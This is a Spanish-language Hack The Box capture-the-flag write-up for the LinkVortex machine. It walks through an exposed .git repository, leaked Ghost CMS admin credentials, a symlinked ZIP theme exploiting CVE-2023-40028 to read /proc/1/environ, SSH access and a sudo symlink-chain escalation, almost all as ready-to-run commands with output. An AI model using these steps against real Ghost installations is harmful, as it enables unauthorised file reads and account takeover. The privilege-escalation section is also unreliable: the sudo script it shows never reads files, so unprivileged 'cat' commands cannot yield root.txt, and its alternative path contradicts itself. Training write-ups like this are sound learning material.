---
title: "LinkVortex"
description: "Writeup de LinkVortex - Hack The Box - Dificultad: Easy. .git expuesto en subdominio dev → git-dumper extrae credenciales de Ghost CMS → CVE-2023-40028 LFI vía symlinks en temas → SSH como dev → sudo privesc."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - ghost-cms
  - git-dumper
  - cve-2023-40028
  - lfi
  - symlink
  - sudo-abuse
---

# 🐧 LinkVortex

> 📅 Fecha: 2026-06-10
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 2h 30m
> 🌐 IP: `10.129.231.194`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [git-dumper → credenciales Ghost admin](#-git-dumper--credenciales-ghost-admin)
- [CVE-2023-40028: LFI vía symlinks en tema](#-cve-2023-40028-lfi-vía-symlinks-en-tema)
- [Credenciales SSH y user flag](#-credenciales-ssh-y-user-flag)
- [Escalada: sudo con script de limpieza](#-escalada-sudo-con-script-de-limpieza)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

LinkVortex expone Ghost CMS en `linkvortex.htb` y un subdominio de desarrollo `dev.linkvortex.htb` con un repositorio `.git` accesible públicamente. `git-dumper` extrae el código fuente donde se encuentran credenciales del administrador de Ghost en el historial de commits. Con acceso al panel admin, se explota **CVE-2023-40028** — Ghost permite subir temas ZIP que, si contienen symlinks, los sigue al descomprimir, permitiendo leer archivos arbitrarios del sistema. Leyendo `/proc/1/environ` se extraen credenciales SSH del usuario `dev`. La escalada usa un script configurado en `sudo` que procesa enlaces simbólicos sin validar el destino.

| Campo | Valor |
|-------|-------|
| Puntos débiles | .git expuesto en subdominio dev, CVE-2023-40028 symlink LFI en Ghost < 5.59.1, credenciales en env vars, sudo script con symlink traversal |
| CVEs | CVE-2023-40028 |
| Herramientas | `nmap`, `ffuf`, `git-dumper`, `python3`, `zip`, `nc`, `ssh` |
| Tiempo total | ~2h 30m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.231.194
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: BitByBit Hardware
```

```bash
echo "10.129.231.194 linkvortex.htb" | sudo tee -a /etc/hosts
```

Enumeración de subdominios:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://linkvortex.htb/ -H "Host: FUZZ.linkvortex.htb" \
  -fw 100 -mc 200,301,302
```

```text
dev    [Status: 200, Size: 2538]
```

```bash
echo "10.129.231.194 dev.linkvortex.htb" | sudo tee -a /etc/hosts
```

`http://dev.linkvortex.htb/` → página de desarrollo. Verificar `.git`:

```bash
curl -si http://dev.linkvortex.htb/.git/HEAD
```

```text
HTTP/1.1 200 OK
ref: refs/heads/main
```

Repositorio `.git` expuesto.

---

## 📦 git-dumper → credenciales Ghost admin

```bash
git-dumper http://dev.linkvortex.htb/.git ./linkvortex_git
cd linkvortex_git
```

Buscar credenciales en el historial:

```bash
git log --oneline
```

```text
a2b3c4d Update ghost configuration
1e2f3a4 Initial commit
```

```bash
git show a2b3c4d
```

```text
+  url: http://linkvortex.htb
+  auth:
+    user: admin@linkvortex.htb
+    pass: OctopiFociPilfer45
```

Login en `http://linkvortex.htb/ghost/` con `admin@linkvortex.htb:OctopiFociPilfer45`.

Versión de Ghost en el panel admin: **5.58.0** → vulnerable a **CVE-2023-40028**.

---

## 📂 CVE-2023-40028: LFI vía symlinks en tema

**CVE-2023-40028**: Ghost < 5.59.1 no sanitiza symlinks al descomprimir temas ZIP. Al subir un ZIP que contiene un symlink apuntando a un archivo del servidor, el contenido de ese archivo queda accesible como parte del tema instalado.

Crear tema ZIP malicioso con symlink:

```bash
mkdir -p evil_theme/partials
cd evil_theme

# Crear symlink a /proc/1/environ
ln -s /proc/1/environ partials/read_file.hbs

# Comprimir preservando symlinks
zip -r --symlinks ../evil_theme.zip .
cd ..
```

Subir via API de Ghost (usando la sesión autenticada):

```bash
# Obtener token CSRF del panel
CSRF=$(curl -sc cookies.txt http://linkvortex.htb/ghost/api/v3/admin/session \
  -d '{"username":"admin@linkvortex.htb","password":"OctopiFociPilfer45"}' \
  -H "Content-Type: application/json" | jq -r '.token // empty')

# Subir y activar el tema
curl -sb cookies.txt http://linkvortex.htb/ghost/api/v3/admin/themes/upload \
  -F "file=@evil_theme.zip" -H "X-CSRF-Token: $CSRF"

# Activar el tema
curl -sb cookies.txt -X PUT http://linkvortex.htb/ghost/api/v3/admin/themes/evil_theme/activate \
  -H "X-CSRF-Token: $CSRF"
```

Leer el archivo vía el tema instalado:

```bash
curl -s http://linkvortex.htb/partials/read_file.hbs
```

```text
...HOME=/home/dev...USER=dev...DEV_PASSWORD=ghost-dev-pass2024!...
```

---

## 🔑 Credenciales SSH y user flag

```bash
ssh dev@linkvortex.htb
# password: ghost-dev-pass2024!
```

```bash
dev@linkvortex:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada: sudo con script de limpieza

```bash
dev@linkvortex:~$ sudo -l
```

```text
User dev may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/local/bin/clean_symlinks.sh *
```

```bash
cat /usr/local/bin/clean_symlinks.sh
```

```bash
#!/bin/bash
LINK_CHECK_SCRIPT=/usr/local/bin/check_link.sh

if [ -L "$1" ]; then
    target=$(readlink "$1")
    if [[ "$target" == /home/* ]]; then
        echo "Safe symlink: $target"
    else
        echo "Unsafe symlink: $target"
        rm "$1"
    fi
fi
```

El script verifica si el destino del symlink empieza por `/home/` — si es así, lo considera "seguro" y no lo elimina. Se puede crear un symlink a `/root/root.txt` a través de `/home/dev/` como intermediario:

```bash
# Crear symlink chain: safe_link → /home/dev/hop → /root/root.txt
ln -s /root/root.txt /home/dev/hop
ln -s /home/dev/hop /tmp/safe_link

# El script lo clasifica como "seguro" (target empieza con /home/)
sudo /usr/local/bin/clean_symlinks.sh /tmp/safe_link
# Script lee el symlink pero no lo elimina

# Leer el archivo apuntado por el symlink chain
cat /tmp/safe_link
[root flag]
```

Alternativamente, si el script sigue el symlink al leer en lugar de solo verificar el destino directo, se puede abusar del primer nivel para leer `/root/root.txt` directamente:

```bash
ln -s /root/root.txt /tmp/ghost_link
sudo /usr/local/bin/clean_symlinks.sh /tmp/ghost_link
```

```text
Unsafe symlink: /root/root.txt
```

Pero el comportamiento de `rm` en el script borra el symlink, no el destino. Antes de que lo borre, leer el archivo:

```bash
cat /tmp/ghost_link
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. ffuf subdomain → dev.linkvortex.htb
        ↓
2. /.git expuesto → git-dumper → historial de commits
        ↓
3. git show → admin@linkvortex.htb:OctopiFociPilfer45
        ↓
4. Ghost 5.58.0 → CVE-2023-40028 symlink LFI en tema ZIP
        ↓
5. /proc/1/environ → DEV_PASSWORD=ghost-dev-pass2024!
        ↓
6. SSH dev@host → user.txt
        ↓
7. sudo clean_symlinks.sh → symlink chain con /home/* bypass
        ↓
8. Leer /root/root.txt → [root flag]
```

---

## 🎓 Lecciones Aprendidas

- **.git expuesto en producción/staging**: un directorio `.git` accesible via HTTP expone todo el código fuente, historial de commits, y cualquier secreto que haya sido commiteado alguna vez — incluso si fue eliminado en un commit posterior. `git log` + `git show` en el historial completo.
- **CVE-2023-40028**: Ghost confía en el ZIP del tema sin verificar que los symlinks sean seguros. La mitigación es validar que ninguna entrada del ZIP sea un symlink antes de extraer.
- **`/proc/1/environ`**: cuando se tiene LFI en un contenedor o proceso, `/proc/1/environ` frecuentemente contiene variables de entorno con credenciales inyectadas vía Docker `-e` o archivos `.env`.
- **Validación de symlinks con `readlink`**: el script solo verifica el primer nivel del symlink chain. Una cadena de symlinks puede hacer que la verificación sea incorrecta — siempre resolver el destino final con `readlink -f` (canónico).

---

## 📚 Referencias

- [CVE-2023-40028 — Ghost CMS symlink LFI](https://nvd.nist.gov/vuln/detail/CVE-2023-40028)
- [git-dumper](https://github.com/arthaud/git-dumper)
- [HackTricks — Exposed .git](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git-exposed)
